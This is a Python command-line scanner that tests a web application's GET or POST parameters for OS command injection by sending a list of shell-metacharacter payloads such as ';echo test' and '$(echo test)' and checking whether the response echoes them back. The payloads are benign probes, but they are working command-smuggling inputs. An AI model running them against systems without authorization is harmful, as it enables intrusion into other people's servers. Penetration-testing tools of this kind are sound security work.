import requests
from urllib.parse import urlparse
from urllib3 import disable_warnings,exceptions
disable_warnings(exceptions.InsecureRequestWarning)
import json
import argparse



proxy_url = 'http://127.0.0.1:8080'
proxies = {
    'http': proxy_url,
    'https': proxy_url,
}

class osInjection:
    def __init__(self, TargetUrl, headers=None, data=None, endpoint=None, PostOsInject=None,osInjectGet=None):
        self.TargetUrl = TargetUrl
        self.hostName = self.getHostname(TargetUrl)
        self.headers = headers
        self.data = data
        self.endpoint = endpoint
        self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');","response.write test", ":response.write test"]
        self.PostOsInject = PostOsInject
        self.GetOsInject = osInjectGet

    def getHostname(self,url):
        parsedUrl = urlparse(url)
        return parsedUrl.hostname
    
    def sendPost(self):
        try:
            if self.headers and self.data and self.endpoint:
                response = requests.post(self.TargetUrl+self.endpoint, headers=self.headers, data=self.data ,proxies=proxies,verify=False)
                return response
            else:
                return False
        except:
            print("error in sending post")
            return False
    
    def checkOsInjectPost(self):
        if self.headers and self.endpoint and self.data and self.PostOsInject :
            for i in self.payloads:
                self.data[self.PostOsInject] = i
                response = self.sendPost()
                if self.checkResponseResult(response):
                    print("OsCommand injection Found",i,"   ",self.TargetUrl)
        else:
            print("all parameter must be passed")

   
    def checkOsInjectGet(self):
        try:
            if self.GetOsInject in self.TargetUrl:
                for i in self.payloads:
                    self.TargetUrl = self.TargetUrl.replace(self.GetOsInject,i)
                    response = requests.get(self.TargetUrl)
                    if self.checkResponseResult(response):
                        print("osInject found in ",i,f"  {self.TargetUrl}")
        except:
            print("error in sending get")
            return False

    def checkResponseStatusCode(self, response):
        try:
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            print("response doesn't have status_code")
    
    def checkResponseResult(self, response):
        try:
            if response.status_code == 200 :
                responseWithoutPayload = response.text.replace("echo test","")
                if "test" in responseWithoutPayload:
                    return True
                else:
                    return False
            else:
                return False
        except:
            print("response doesn't have test")
    
    def BlindOsCommandInjection(self):
        pass # to make later

            
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ssrf script", add_help=False)
    parser.add_argument('--help', '-h', action='help', help='this is a help message')
    parser.add_argument('--url', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--headers', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--postData', type=str, help='Input dictionary PostData like {"key":"value"}')
    parser.add_argument('--endpoint', type=str, help='Input str')
    parser.add_argument('--osInjectPost', type=str, help='Input which will be the payload')
    parser.add_argument('--osInjectGet', type=str, help='Input which will be the payload')





    args = parser.parse_args()
    url = args.url
    headers = json.loads(args.headers) if args.headers else None
    PostData = json.loads(args.postData) if args.postData else None
    EndPoint = args.endpoint
    osInjectPost = args.osInjectPost
    osInjectGet= args.osInjectGet


    Test = osInjection(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint, PostOsInject=osInjectPost, osInjectGet=osInjectGet)
    Test.checkOsInjectGet()

    